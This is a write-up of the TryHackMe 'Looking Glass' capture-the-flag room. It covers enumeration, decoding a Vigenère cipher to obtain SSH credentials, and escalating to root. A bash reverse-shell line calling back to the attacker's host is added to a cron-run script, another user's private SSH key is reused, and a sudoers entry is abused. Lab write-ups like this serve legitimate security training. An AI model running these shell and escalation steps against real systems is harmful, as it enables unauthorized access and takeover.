# WriteUP for Looking Glass room from TryHackMe

## Objectives :- Get the user flag & Get the root flag.

### Hint :- O(log n) A looking glass is a mirror.

We Start our enumerations from nmap and we see a ton of ports , some of which have higher as output some as lower so this is a simple questions of binary search(hint confirms that). To acheive the real service i wrote this script [port_spammer.py](port_spammer.py). This gives us the real service.(We can try this by bash also).

So We get [this](cipher.txt) from the real service.
Looking around this we can use decode.fr to decode it using cipher Vigerne Cipher which on automatic decryption gives the write key and then we have the [decoded text](decoded.txt).

This file has the the secret 'bewareTheJabberwock'
So we supply this secret to ssh service.
And we get the creds.
and we login to find the user.txt, which has user flag in reverse  order so we can just 
```cat user.txt | rev ```.
now we can look around using linpeas.(lets copy it to the system)
```scp /location/linpeas.sh jabberwock@IP:. ```
Using linoeas we find the vulnerability.
```
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```
and we see that upon reboot tweedledum will run this the script in present on out directory so we can add a line
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/<our ip>/<port> 2>&1 0>&1'
```
and we will listen on our machine from the port.
and we will get a reverse connection as tweedeldum.

And we get a file 'HumptyDumpty' which has many hashes out 5 are SHA256 we can crack it using CrackStation but they are not the password the final line is the password which is in base16.

Now that we have the password for humptydumpty we can login as humpty dumpty.
Now after much looking we realise that alice is executable but not readable, and the .ssh folder is executable by humptydumpty and the id_rsa is readable.
so now we can login as alice.
```
chmod 600 alice_id_rsa
ssh -i alice_id_rsa alice@IP
``` 
now that we are alice we can take a look at /etc/sudoers.d
and find out that alice can become root user named as ssalg-gnikool using
```sudo -h ssalg-gnikool```

and now we are root and we can get the root.txt file. 
